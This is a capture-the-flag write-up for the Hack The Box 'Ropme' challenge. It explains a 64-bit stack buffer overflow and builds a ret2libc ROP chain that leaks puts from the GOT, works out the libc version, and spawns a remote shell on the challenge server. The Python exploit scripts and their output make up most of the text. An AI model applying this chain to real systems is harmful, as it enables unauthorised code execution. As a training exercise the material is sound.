# Hack The Box - PWN - Ropme


### Binary Analysis
First of all, I try to find the main function of the binary and then try to find a vulnerability that I can exploit. We see a rather simple main.
```
shaked@shaked-ubuntu:~/programming2/challenges/hack_the_box/ropme$ file ropme
ropme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e30ea7fd405c5104fd0d97dc464c513b05005fdb, not stripped
```

The binary only has one main function and this is it:
```

**QUESTION: What is the vulnerability in the code?**
Let's break it down to pieces:

The first piece we observe is this one, which is calling the `puts@plt`:
```
0x0000000000400635 <+15>:	mov    edi,0x4006f8
0x000000000040063a <+20>:	call   0x4004e0 <puts@plt>
```
According to the [man page of puts][1]: it's defined as `int puts(const char *s);` which means this function takes exactly 1 argument, which is a pointer to the start of a cstring.

**QUESTION: Why is the argument passed through EDI? Why not through the stack?**
On x64 (as opposed to x32) the arguments are passed via the registers:
1. RDI Holds the first argument
2. RSI Holds the second argument
3. RDX Holds the third argument
4. RCX Holds the forth argument
5. R8 Holds the fifth argument
6. R9 Holds the sixth argument

The second piece is the calling of `fflush` which is defined as `int fflush(FILE *stream);`

```
0x000000000040063f <+25>:	mov    rax,QWORD PTR [rip+0x200a0a]        # 0x601050 <stdout@@GLIBC_2.2.5>
0x0000000000400646 <+32>:	mov    rdi,rax
0x0000000000400649 <+35>:	call   0x400510 <fflush@plt>
```
So here we see that `stdout` is being put on RDI and then the call to `fflush` takes place. After looking at the [man page of fflush][2]: I noticed that I can call `fflush(0)` and flush all the streams at once, this could be handy in the future.


The third and last piece of the main is the one calling `fgets` which is defined as `char *fgets(char *s, int size, FILE *stream);`. Let's observe the code:

```
0x000000000040064e <+40>:	mov    rdx,QWORD PTR [rip+0x200a0b]        # 0x601060 <stdin@@GLIBC_2.2.5>
0x0000000000400655 <+47>:	lea    rax,[rbp-0x40]
0x0000000000400659 <+51>:	mov    esi,0x1f4
0x000000000040065e <+56>:	mov    rdi,rax
0x0000000000400661 <+59>:	call   0x400500 <fgets@plt>
```

Here, we notice that:
1. RDX Holds the third argument which is `FILE *` (stdout actually)
2. RSI Holds the second which is the `int size` as `0x1f4 = 500`
3. RDI Holds the first argument which is the location of the buffer we are writing to

So, the program is asking for `500` bytes and places them on a buffer which is located on the stack, if we take a look again at the argument at RDI we notice that is pointing to `rbp-0x40` so that means if we write more than `0x40 = 64` bytes to that buffer - we would override the `rbp` value and most likely the return address afterwards

**The vulnerability is clear, we're dealing with a buffer overflow here.**

The next thing I do after discovering that I could use a vulnerability is to determine what am I allowed to do. Usually if the buffer overflow was due to a use of `strcpy` then that means I cannot use null bytes.

But that is not the case here, if we take a look at [fgets man page][3]: we see that `fgets` stops getting its input after EOF or a new line

> fgets() reads in at most one less than size characters from stream and stores them into the buffer pointed to by s. Reading stops after an EOF or a newline. If a newline is read, it is stored into the buffer. A terminating null byte (aq\0aq) is stored after the last character in the buffer.

Great! so we can use null bytes in our input. But have to remember to avoid using newline as a character.

So, to sum up the first part of the analysis:

* We have to exploit the buffer overflow vulnerability to somehow redirect the program to execute arbitrary code, I'm thinking of `system("/bin/sh")`
* We have to assume ASLR is on
  * We do not know the location which `system` is placed
  * I cannot use the `"/bin/sh"` string by writing it to the stack. And of course we also do not know the location of that string in `libc` because of ASLR
* Even if ASLR might be defeated, and we could learn the base address which libc is being loaded to - **the offsets of stuff may change because the libc version of the remote machine may be different from ours**, we have to keep that in mind when exploiting remote machines


### Exploiting the binary locally
Before I worry myself about the remote machine and ASLR and glibc version; I try to see if I can utilize the buffer overflow locally. I usually start by manipulating the data *manually* in GDB, then formulate a payload using a Python script.

I start with a simple python script that fills the buffer (of size 64 if we recall), and overrides the frame pointer (the old EBP, of size 8 bytes because this binary is x64). So we need `64+8=72` bytes to fill the buffer and then we will be able to override the return address on the stack. Let's try!

```Python
PAD = "A" * 72

print PAD
```

Feeding this input to the binary our stack looks like this

**What? A segmentation fault? why?**

After breaking my head over this for a long time, I learned that when you call `system` the stack needs to be "16 bytes aligned" otherwise an exception is thrown (like we've just experienced).

When the compiler prepares the binary for us from the C code he always makes sure this happens, but when we mess around with the registers and the jumps - we can break things.

So what do we do? First, we have to make sure the stack pointer is 16 bytes aligned and not 8 bytes aligned like it is right now.
Because as of now, when we `ret` to `system` the stack pointer ends with `8` and we need it to end with `0` (in hex, if the least-significant-bit is zero, the number is a multiple of 16).

How do we get there? well, if we think about it for a second, in the end-result exploit we will need to pass an argument to `RDI` before calling system, so if we could first `ret` to some instruction that does something like `pop rdi; ret`, our stack will be 16 bytes aligned! (Do you see why?)

So we are looking for a ROP gadget, preferably one that is in a location which is not randomized by ASLR.
PEDA (a nice gdb plugin) provides a nice way of looking for gadgets via a string.

0x004006d3 : (b'5fc3')	pop rdi; ret
```

This is good because now we can put something on the stack that will be `pop`ed to `RDI`, and then return to an arbitrary address. I will keep in mind that the gadget I found is in a location that is not randomized by ASLR and may be very handy when crafting out final exploit.

Our current exploit:

```python
import struct

def ptr(n):
    return struct.pack("Q", n)

PAD = "A" * 72
gadget_pop_rdi_ret = ptr(0x4006d3)


system_addr = ptr(0x7ffff7a33440)
binsh_addr= ptr(0x7ffff7b97e9a)

payload = PAD
payload += gadget_pop_rdi_ret   # ret to here
payload += binsh_addr           # this will be popped to RDI
payload += system_addr          # return here with stack aligned

print payload

```

So far, the exploit works locally, **if of course, we disable ASLR**. So the next step is to think: what are the locations of `system` and `"bin/sh"` going to be on the remote machine? how do we defeat ASLR?


### Defeating ASLR via information leak
When I say "defeating ASLR" I basically mean: "how do I know the base which libc is loaded to every time?" because if I know the base address, I could compute the location of other symbols in libc based on their known offsets. So obviously we cannot know where libc is loaded to right away, we do not have kernel access to the remote machine and we cannot really brute force our way to the right address.

So the solution here is to exploit some chunk of the code that could tell us where some location which we recognize, was loaded.
For example, if we know `puts` was loaded to virtual address `0x100` and we know the offset of puts from the beginning of libc is `0x10`, then it means the base of libc is `0x100 - 0x10 = 0xf0`!

How can we know the location of some address of `puts`? fortunately for us, `puts` is being called by the program and is a part of the original code.
Thanks to that, the address of puts is stored on the Global Offset Table (GOT) of the file.

Looking at the file's relocations table we can see the following:

```
shaked@shaked-ubuntu:~/programming2/challenges/hack_the_box/ropme$ objdump -R ropme

ropme:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE

0000000000601050 R_X86_64_COPY     stdout@@GLIBC_2.2.5
0000000000601060 R_X86_64_COPY     stdin@@GLIBC_2.2.5
0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000601020 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5
0000000000601028 R_X86_64_JUMP_SLOT  fgets@GLIBC_2.2.5
0000000000601030 R_X86_64_JUMP_SLOT  fflush@GLIBC_2.2.5
```

What we learn from this is that the location of `puts` at libc will be determined during runtime and will be stored at a fixed non-randomized location which is: `0x601018`. (This can be confirmed also if you follow the call to `puts@plt`)

So the plan is clear, we need to somehow make the program leak the location at address `0x601018`, to do that we can manipulate the program to call `puts((char *) (*0x601018))`. How is that possible?

- Well, the location of `puts@plt` is fixed as this is a PLT stub that actually calls the true function, so we will just `ret` to that stub
- We know the location which we want to print, we would make the program print the value in `0x601018` as a string but we will read the bytes from it and learn the address of `puts`

Let's get to work, we will use the same technique of ROPing to make the program call the `puts` function with the argument we provide:

```Python
import struct

def ptr(n):
    return struct.pack("Q", n)

PAD = "A" * 72


gadget_pop_rdi_ret = ptr(0x4006d3)
puts_plt = ptr(0x4004e0)
puts_got = ptr(0x601018)

payload = PAD
payload += gadget_pop_rdi_ret   # ret to here
payload += puts_got             # this will be popped to RDI
payload += puts_plt             # return here with stack aligned

print payload
```

It's important to note though that we will find something with this code only if it runs AFTER the GOT entry has been filled (that is , if `puts` was already called). Which is our case of course because our code runs after the entire main is done.

**QUESTION: I run the exploit but get nothing back! what's wrong?**
That's because `puts` places the string on the stream but it doesn't yet flush it, so we have to call `fflush(0)` as well (remember the `fflush`?).
So we will add the following to the exploit code.

```python
import struct

def ptr(n):
    return struct.pack("Q", n)

PAD = "A" * 72


gadget_pop_rdi_ret = ptr(0x4006d3)
puts_plt = ptr(0x4004e0)
fflush_plt = ptr(0x400510)

puts_got = ptr(0x601018)
NULL = ptr(0x0)

payload = PAD
payload += gadget_pop_rdi_ret   # ret to here
payload += puts_got             # this will be popped to RDI
payload += puts_plt             # return here with stack aligned

payload += gadget_pop_rdi_ret   # ret to here
payload += NULL                 # this will be popped to RDI
payload += fflush_plt           # return here

print payload
```

Next step is to compute the base of libc from that value, **but before we do that, we must determine the libc version of the remote machine** this requires our script to be a little bit more advanced and to work with sockets, don't worry - there's not that much we need to add!

At the end, we will use something like this in our code:

```python
def compute_libc_base_from_puts(puts_va):
    # this is true for libc 2.27
    # this is true for my local machine only
    puts_offset_in_libc = 0x0809c0

    return puts_va - puts_offset_in_libc
```

So the next step is to figure out what version of libc the remote machine is running, and then place the correct offset in our function so we could know the base of libc and thus the addresses of `system` and `"/bin/sh"`.

### Leaking GLIBC version

We have to remember that ASLR, doesn't randomize the location of libc entirely,
let's observe:
```
shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ ldd ./ropme | grep libc
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2c2aa0b000)
shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ ldd ./ropme | grep libc
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f05947fd000)
shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ ldd ./ropme | grep libc
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007efe992b4000)
shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ ldd ./ropme | grep libc
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2a13198000)
shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ ldd ./ropme | grep libc
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd33e7f5000)
shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ ldd ./ropme | grep libc
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb92bd11000)
shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ ldd ./ropme | grep libc
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7b0e759000)
```

Notice any pattern? well, the last three hex digits of the address are always zero, also - the start of the address is `7f`.
Which makes some sense because we cannot really expect libc to pop somewhere before the .text segment in our process, or in another weird location. So it has to have some bounds.

This still isn't a good enough excuse to try brute force, but - this feature can help us in determining the version of libc which was loaded. How? Well, if the virtual address of `puts` is `0x7ffff7a649c0`, and there are only so many different offsets which `puts` can be placed in (in every version of libc the offset may differ). Then based only on that address, we could compute which of all possible offsets will place the base of libc at an address that looks like that: `0x7f_______000`.

Sounds like a lot of work right? Well, luckily for us, we can use a tool that will do the computation for us. Introducing: [libc database][4].

So, we could just plug the virtual address we see for `puts` and libc database will suggest what versions are possible that will yield such virtual address.

![libc_db_input_1](ld_1.png)

Then we see the suggestions:

![libc_db_input_2](ld_2.png)

Naturally, the more addresses we provide, the amount of possible versions shrinks.

So, we have everything we need to know, we just have to start working! let's prepare our code to have the remote machine leak the address of `puts`, and let's see if that would be enough for us to learn the libc version of it. If that will not be enough - we might have to also leak `fflush` and `fgets`.

Let's put everything together to one script leaking the `puts` location: (The changes so far are only in the `remote()` function)

```Python
import struct
import socket
import binascii

def ptr(n):
    return struct.pack("Q", n)

def compute_libc_base_from_puts(puts_va):
    # this is true for libc 2.27
    # this is true for my local machine only
    puts_offset_in_libc = 0x0809c0

    return puts_va - puts_offset_in_libc

def remote(data):
    remote_address = (("docker.hackthebox.eu",35034))
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print "connecting to ", remote_address
    conn.connect(remote_address)

    # server's initial message: "ROP ME outside..."
    print conn.recv(1024)

    print "connected. sending data"
    conn.send(bytes(data + "\n"))

    ans = conn.recv(1024)
    print "server responded:"
    print ans
    print binascii.hexlify(ans)


PAD = "A" * 72


gadget_pop_rdi_ret = ptr(0x4006d3)
puts_plt = ptr(0x4004e0)
fflush_plt = ptr(0x400510)

puts_got = ptr(0x601018)
NULL = ptr(0x0)

payload = PAD
payload += gadget_pop_rdi_ret   # ret to here
payload += puts_got             # this will be popped to RDI
payload += puts_plt             # return here with stack aligned

payload += gadget_pop_rdi_ret   # ret to here
payload += NULL                 # this will be popped to RDI
payload += fflush_plt           # return here

remote(payload)
```

This is the output we see when we run the script:

```
shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ python exploit.py
connecting to  ('docker.hackthebox.eu', 35034)
ROP me outside, how 'about dah?

connected. sending data
server responded:
�F�~N

9046d87e4e7f0a
```

The unreadable characters are obviously not important, what we care about is the hex representation of the response which we see in the last line.
Notice how `9046d87e4e7f0a` doesn't really look like an address... **but** let's take a look at it for a second.

The last byte is `0a` which is a new line which makes sense because `puts` appends a new line character to the end of the string when it prints it out. OK, what about the next byte? `7f` that does look like a start of an address, so maybe it's just that the order of the bytes is reversed, let's modify the code a little bit:

```Python
def remote(data):
    # ....
    ans = conn.recv(1024)
    print "server responded:"
    print ans

    ans = ans[:-1]  # omit the 0a
    ans = ans[::-1]  # reverse the order

    print "0x" + binascii.hexlify(ans)
```

Now we see:

```
shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ python exploit.py
connecting to  ('docker.hackthebox.eu', 35034)
ROP me outside, how 'about dah?

connected. sending data
server responded:
�vоS

0x7f53bed07690
```

Great! we have successfully leaked the address of `puts` on the remote machine. Let's look at that in libc database to maybe learn the version of libc on the remote machine:

![libc_db_second_1](libc_1.png)
![libc_sb_second_2](libc_2.png)
We got 2 matches, but both indicate the same libc version so the offset of the important stuff is the same (I checked). You can try as an exercise to call the server again and have it leak the location of `puts` again if you feel uncertain, or have the process return again to `puts` and this time also print the location of `fflush` and `fgets`. Clicking on one of the versions we see:

![libc_sb_second_3](libc_3.png)

Awesome! offsets of everything we look for! so in this leak, the virtual address we have for `puts` was `0x7f53bed07690`, which according to the table above, means that the libc base was at `0x7f53bed07690 - 0x67690 = 0x7f53beca0000`.

Definitely looks like a valid libc base.

Let's enhance the code to use this information to compute the virtual address of `system` and `"/bin/sh"`

```Python
def compute_libc_base_from_puts(puts_va):
    # remote machine uses libc v2.23
    puts_offset_in_libc = 0x6f690
    return puts_va - puts_offset_in_libc

def remote(data):
    remote_address = (("docker.hackthebox.eu",35034))
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print "connecting to ", remote_address
    conn.connect(remote_address)

    # server's initial message: "ROP ME outside..."
    print conn.recv(1024)

    print "connected. sending data"
    conn.send(bytes(data + "\n"))


    ans = conn.recv(1024)    
    ans = ans[:-1]  # omit the 0a
    ans = ans[::-1]  # reverse the order

    print "Virtual address of puts is: 0x" + binascii.hexlify(ans)

    libc_base = compute_libc_base_from_puts(int(binascii.hexlify(ans), 16))
    print "Base of libc:", hex(libc_base)
    print "Address of system: ", hex(libc_base + 0x45390)
    print "Address of binsh: ", hex(libc_base + 0x18cd57)
```

Which gives us:

```
shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ python exploit.py
connecting to  ('docker.hackthebox.eu', 35034)
ROP me outside, how 'about dah?

connected. sending data
Virtual address of puts is: 0x7fdc0ec36690
Base of libc: 0x7fdc0ebc7000
Address of system:  0x7fdc0ec0c390
Address of binsh:  0x7fdc0ed53d57
```

Note how libc base is different now, this is expected as ASLR is active on the remote machine. BUT! we can successfully learn the base of it every run!

One more thing to finish, after we leak the address - the program dies, and when the program dies - the offsets change again! so we need to ask ourselves: **how to leak the addresses and also keep the process alive so that we will be able to send it to system("/bin/sh")?**

Solution: after returning from `fflush`, let's return to `main()` again! This will require us to forge a new payload and send it again. So our (almost) final code is:

```Python
import struct
import socket
import binascii

def ptr(n):
    return struct.pack("Q", n)

def compute_libc_base_from_puts(puts_va):
    # remote machine uses libc v2.23
    puts_offset_in_libc = 0x6f690
    return puts_va - puts_offset_in_libc

def remote(data):
    remote_address = (("docker.hackthebox.eu",35034))
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print "connecting to ", remote_address
    conn.connect(remote_address)

    # server's initial message: "ROP ME outside..."
    print conn.recv(1024)

    print "connected. sending data"
    conn.send(bytes(data + "\n"))


    # Only take the 7 first bytes of the input
    # Because the rest of it will be "ROP Me outside ..." again
    # we don't care about that, we care about the address only
    ans = conn.recv(1024)[:7]      
    ans = ans[:-1]  # omit the 0a
    ans = ans[::-1]  # reverse the order

    print "Virtual address of puts is: 0x" + binascii.hexlify(ans)

    libc_base = compute_libc_base_from_puts(int(binascii.hexlify(ans), 16))
    print "Base of libc:", hex(libc_base)
    print "Address of system: ", hex(libc_base + 0x45390)
    print "Address of binsh: ", hex(libc_base + 0x18cd57)

    # Craft new payload
    payload2 = PAD                      # 72 bytes of "A"s
    payload2 += gadget_pop_rdi_ret      # return there when done with main

    # address of "/bin/sh", this will be popped to RDI
    payload2 += ptr(libc_base + 0x18cd57)

    # Address of system. return here after you pop
    payload2 += ptr(libc_base + 0x45390)    


    # Send the payload
    conn.send(payload2 + "\n")

    # Get back an answer, we expect that system("/bin/sh") will run
    print conn.recv(1024)



PAD = "A" * 72

main_addr = ptr(0x400626)
gadget_pop_rdi_ret = ptr(0x4006d3)
puts_plt = ptr(0x4004e0)
fflush_plt = ptr(0x400510)

puts_got = ptr(0x601018)
NULL = ptr(0x0)

payload = PAD
payload += gadget_pop_rdi_ret   # ret to here
payload += puts_got             # this will be popped to RDI
payload += puts_plt             # return here with stack aligned

payload += gadget_pop_rdi_ret   # ret to here
payload += NULL                 # this will be popped to RDI
payload += fflush_plt           # return here

payload += main_addr            # After the fflush, go to main again
                                # Ask the attacker for input again!

remote(payload)
```

This is what we get:

```
shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ python exploit.py
connecting to  ('docker.hackthebox.eu', 35034)
ROP me outside, how 'about dah?

connected. sending data
Virtual address of puts is: 0x7f96309ad690

Address of binsh:  0x7f9630acad57

```

What? "%s%s%s%s%s%s%s%s" not found? who asked you to run that? the only explanation that I can think of is that it may be that the offset of `"/bin/sh"` was wrong. And that we have sent the wrong string.

To make sure, let's back up a little bit and try to put that string in the `puts` function and see what string is in that offsets, similar to what we did to leak the address - but this time we print a string.

The code:

```Python
def remote(data):
    remote_address = (("docker.hackthebox.eu",35034))
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print "connecting to ", remote_address
    conn.connect(remote_address)

    # server's initial message: "ROP ME outside..."
    print conn.recv(1024)

    print "connected. sending data"
    conn.send(bytes(data + "\n"))

    ans = conn.recv(1024)

    # Only take the 7 first bytes of the input
    # Because the rest of it will be "ROP Me outside ..." again
    # we don't care about that, we care about the address only
    ans = ans[:7]      
    ans = ans[:-1]  # omit the 0a
    ans = ans[::-1]  # reverse the order

    print "Virtual address of puts is: 0x" + binascii.hexlify(ans)

    libc_base = compute_libc_base_from_puts(int(binascii.hexlify(ans), 16))
    print "Base of libc:", hex(libc_base)
    print "Address of system: ", hex(libc_base + 0x45390)
    print "Address of binsh: ", hex(libc_base + 0x18cd57)

    # Craft new payload
    payload2 = PAD                      # 72 bytes of "A"s
    payload2 += gadget_pop_rdi_ret      # return there when done with main

    # address of "/bin/sh", this will be popped to RDI
    payload2 += ptr(libc_base + 0x18cd57)

    # Instead of calling system now, let's call puts
    payload2 += puts_plt

    # fflush
    payload2 += gadget_pop_rdi_ret
    payload2 += NULL
    payload2 += fflush_plt

    ## WILL RETURN SOON
    # Address of system. return here after you pop
    # payload2 += ptr(libc_base + 0x45390)    


    # Send the payload
    conn.send(payload2 + "\n")

    # Get back an answer, we expect that system("/bin/sh") will run
    print conn.recv(1024)
```

And the output:

```
shaked@shaked-ubuntu:/media/psf/Home/Desktop/programming2/challenges/hack_the_box/ropme$ python exploit.py
connecting to  ('docker.hackthebox.eu', 35034)
ROP me outside, how 'about dah?

connected. sending data
Virtual address of puts is: 0x7f09f667e690
Base of libc: 0x7f09f660f000
Address of system:  0x7f09f6654390
Address of binsh:  0x7f09f679bd57
%s%s%s%s%s%s%s%s
```

So it seems this is actually the string that is in the offset. I couldn't really tell why libc is wrong, but it doesn't matter. Let's look around that string and look for the string we want.

```Python
offset = 0x18cd57

while 1:
    payload2 = PAD                      # 72 bytes of "A"s
    payload2 += gadget_pop_rdi_ret      # return there when done with main

    # address of "/bin/sh", this will be popped to RDI
    payload2 += ptr(libc_base + offset)

    # Instead of calling system now, let's call puts
    payload2 += puts_plt

    # fflush
    payload2 += gadget_pop_rdi_ret
    payload2 += NULL
    payload2 += fflush_plt

    payload2 += main_addr   # back to main so we can send payload again


    ## WILL RETURN SOON
    # Address of system. return here after you pop
    # payload2 += ptr(libc_base + 0x45390)    


    # Send the payload
    conn.send(payload2 + "\n")

    # Get back an answer, we expect that system("/bin/sh") will run
    print "string @ " + hex(offset), "\t", conn.recv(1024)

    # After reach loop, change the offset
    offset -= 0x10  
```

Basically, we look downwards for strings. If I won't find "bin/sh" after a while, I will look upwards.

Lucky us! the offset was actually `0x18cd17` and not what the libc database said.
Let's re-run the script with the new offset

Our final script

```Python
import struct
import socket
import binascii

def ptr(n):
    return struct.pack("Q", n)

def compute_libc_base_from_puts(puts_va):
    # remote machine uses libc v2.23
    puts_offset_in_libc = 0x6f690
    return puts_va - puts_offset_in_libc

def remote(data):
    remote_address = (("docker.hackthebox.eu",35076))
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print "connecting to ", remote_address
    conn.connect(remote_address)

    # server's initial message: "ROP ME outside..."
    print conn.recv(1024)

    print "connected. sending data"
    conn.send(bytes(data + "\n"))

    ans = conn.recv(1024)
    print ans

    # Only take the 7 first bytes of the input
    # Because the rest of it will be "ROP Me outside ..." again
    # we don't care about that, we care about the address only
    ans = ans[:7]      
    ans = ans[:-1]  # omit the 0a
    ans = ans[::-1]  # reverse the order

    print "Virtual address of puts is: 0x" + binascii.hexlify(ans)

    libc_base = compute_libc_base_from_puts(int(binascii.hexlify(ans), 16))
    print "Base of libc:", hex(libc_base)
    print "Address of system: ", hex(libc_base + 0x45390)
    print "Address of binsh: ", hex(libc_base + 0x18cd17)  # fixed this

    # Craft new payload

    payload2 = PAD                      # 72 bytes of "A"s

    payload2 += gadget_pop_rdi_ret      # return there when done with main

    # Address of "/bin/sh", this will be popped to RDI
    payload2 += ptr(libc_base + 0x18cd17)

    # Address of system. return here after you pop
    payload2 += ptr(libc_base + 0x45390)
    # payload2 += puts_plt   

    # Send the payload
    conn.send(payload2 + "\n")

    # Send a command to system
    conn.send("ls\n")

    # What do we get back?
    print "got back:"
    print conn.recv(1024)





PAD = "A" * 72

main_addr = ptr(0x400626)
gadget_pop_rdi_ret = ptr(0x4006d3)
puts_plt = ptr(0x4004e0)
fflush_plt = ptr(0x400510)

puts_got = ptr(0x601018)
NULL = ptr(0x0)

payload = PAD
payload += gadget_pop_rdi_ret   # ret to here
payload += puts_got             # this will be popped to RDI
payload += puts_plt             # return here with stack aligned

payload += gadget_pop_rdi_ret   # ret to here
payload += NULL                 # this will be popped to RDI
payload += fflush_plt           # return here

payload += main_addr            # After the fflush, go to main again
                                # Ask the attacker for input again!

We get back:

ROP me outside, how 'about dah?

Virtual address of puts is: 0x7fceeffdb690
Base of libc: 0x7fceeff6c000
Address of system:  0x7fceeffb1390
Address of binsh:  0x7fcef00f8d17
got back:
flag.txt
ropme
spawn.sh
```

So we learn that there are 3 files in the directory, we can just send "cat flag.txt" instead of "ls" and get the flag

### Note to self

This challenge was more difficult that I've expected. At first glance I noticed the buffer overflow and thought immediately that I solved it, silly me. I feel like this challenge was more practical than it was "difficult" in a sense that it was hard to solve, never the less - I have learnt a lot

* Stack alignment is a thing when calling functions, **remember that next time you decide to mess around with calls**
* Leaking addresses can be done not just with format string exploit, but with ROPing to `puts` as well!
* [Libc database][4] Can be a very handy tool to figure out the remote machine's libc version
* Looping back to main again can help you when you leak an address from the machine and want to use it in a new payload
